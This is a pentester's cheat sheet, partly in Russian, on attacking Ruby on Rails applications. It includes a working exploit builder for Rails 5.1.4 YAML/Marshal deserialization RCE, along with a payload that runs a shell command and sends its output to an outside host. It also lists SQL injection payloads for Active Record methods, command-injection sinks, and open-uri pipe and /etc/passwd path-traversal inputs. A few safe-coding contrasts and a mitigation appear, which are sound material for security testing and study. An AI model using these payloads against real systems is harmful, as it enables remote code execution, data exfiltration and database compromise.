# Ruby Security

## Deserializations

### Marshal.load(\<user\_input>) = RCE

Ruby Marshal+Base64 RCE payload playground/generator: [https://repl.it/@allyshka/Ruby-RCE-with-Marshalload](https://repl.it/@allyshka/Ruby-RCE-with-Marshalload)

Other guide: [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)

### YAML.load(\<user\_input>) = RCE

### Rails 5.1.4 YAML unsafe deserialization RCE payload

Example: [https://gist.github.com/niklasb/df9dba3097df536820888aeb4de3284f](https://gist.github.com/niklasb/df9dba3097df536820888aeb4de3284f)

Точно работает на Rails **5.1.4**

```ruby
require "erb"
require "base64"
require "active_support"
 
if ARGV.empty?
  puts "Usage: exploit_builder.rb <source_file>"
  exit!
end
 
erb = ERB.allocate
erb.instance_variable_set :@src, File.read(ARGV.first)
erb.instance_variable_set :@lineno, 1
 
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
 
payload = Base64.encode64(Marshal.dump(depr))
 
puts <<-PAYLOAD
---
!ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Rack::Session::Abstract::SessionHash
      req: !ruby/object:Rack::Request
        env:
          rack.session: !ruby/object:Rack::Session::Abstract::SessionHash
            loaded: true
          HTTP_COOKIE: "a=#{payload}"
      store: !ruby/object:Rack::Session::Cookie
        coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
        key: a
        secrets: []
      exists: true
PAYLOAD
```

Пример payload:

```ruby
require "base64"
out = `pwd`
url = URI.parse('http://bizone.pw')
req = Net::HTTP::Get.new(url.to_s + '/?q=' + Base64.strict_encode64(out))
res = Net::HTTP.start(url.host, url.port) {|http|
  http.request(req)
}
```

## IDOR in RoR

Добавление .json к пути, если у нас Ruby

```
/user_data/2341      --> 401 Unauthorized
/user_data/2341.json --> 200 OK
```

## SQL Injections

### SQLi in ORDER BY

Только посмотрите, как круто в коде `RubyOnRails` выглядит `SQLi` в ORDER BY:\
`Client.order(:first_name)`\
Т.е. Active Record Query Interface после такого вызова построит следующий запрос:\
`'SELECT * FROM Clients ORDER BY #{:first_name}'` , где `#{:first_name}` - это user input.\
Метод `.order()` не фильтрует и не экранирует получаемые данные. А значит, в таком случае мы легко можем раскрутить `Blind SQLi` c подзапросом вроде:\
`ORDER BY 1,(SELECT 1 FROM SLEEP(5))`-- , где дальше можно крутить Boolean-based, Time-based и пр.\
P.S. Почему это круто?!\
Потому что разработчики, когда пишет код, даже не подозревает, что вызов вроде `Client.order(:first_name)` приведет к `SQLi`. Тут ничего не режет глаз, нет конкатенации, нет опасных функций, казалось бы и пр.

### SQLi: Active Record — Rails ORM

Как выглядит в коде SQLi

```ruby
def index
    ...
    name = params[:name]
    @projects = Project.where("name like '" + name + "'");
    ...
end
```

```ruby
# Unsafe
st = ActiveRecord::Base.connection.raw_connection.prepare(
    "select * from users where email = '#{email}'"
)
results = st.execute
st.close

# Safe
st = ActiveRecord::Base.connection.raw_connection.prepare(
    "select * from users where email = ?"
)
results = st.execute(email)
st.close
```

```ruby
# Unsafe exists
User.exists? params[:user]

# For Example: ?user[]=1 -> 
SELECT  1 AS one FROM "users"  WHERE (1) LIMIT 1


# Unsage find_by
params[:id] = "admin = 't'"
User.find_by params[:id]

# from
params[:from] = "users WHERE admin = 't' OR 1=?;"
User.from(params[:from]).where(admin: false)

# group
params[:group] = "name UNION SELECT * FROM users"
User.where(:admin => false).group(params[:group])

# ...
```

В общем, надо просматривать обращение ко всем объектам, унаследованным от ActiveRecord::Base и смотреть обращение к ним через встроенные функции where, find\_by, exists и тп

Подробнее с примерами: [\
https://rails-sqli.org/](https://rails-sqli.org/)

## Command Injection

```ruby
eval("ruby code here")
system("os command here")
`ls -al /` # (backticks contain os command)
exec("os command here")
open("\| os command here")
```

## Code Execution

```ruby
class_eval <<-RUBY, __FILE__, __LINE__ + 1
  def #{item}?
    code == '#{item.upcase}'
  end
RUBY
```

## open-uri

Если используется в коде этот пакет, то есть возможность исполнить код на стороне сервера (так как используется внутри [Kernel.open](https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-open))

Пример кода уязвимого

```ruby
require "open-uri"

open(params[:url]) { |f|
    f.each_line {|line| p line}
}
```

Payloads:

```ruby
url = "|ls"

# open(params[:url]) if param[:url] =~ /^https:// , то сработает так:
url = "|touch n;\nhttps://url.com"  # Почему? читай про broken Regexp (use \A\z) в Ruby: https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html

# Если так: open(URI(params[:url])) -> Local File Read
url = "/etc/passwd"

# open(params[:url]) if URI(params[:url]).scheme == 'http'
url = "http:/../../../../../../../etc/passwd"
```

Mitigation: переходить на `openURI`.

## SSTI

```ruby
render <user_input>
```

SSTI: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/6bcd2e8a6a39d26a547a70d83dfebef4c2c6f801/Server%20Side%20Template%20Injection/README.md#ruby---basic-injections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/6bcd2e8a6a39d26a547a70d83dfebef4c2c6f801/Server%20Side%20Template%20Injection/README.md#ruby---basic-injections)

## Papers

Attacking Ruby on Rails Applications: [http://phrack.org/issues/69/12.html](http://phrack.org/issues/69/12.html)

OWASP Ruby on Rails Cheatsheet: [https://cheatsheetseries.owasp.org/cheatsheets/Ruby\_on\_Rails\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Ruby\_on\_Rails\_Cheat\_Sheet.html)

RoR Security Guide: [http://rusrails.ru/ruby-on-rails-security-guide](http://rusrails.ru/ruby-on-rails-security-guide)

Доклад про историю развития Security in RoR: [https://github.com/presidentbeef/rails-security-history](https://github.com/presidentbeef/rails-security-history)
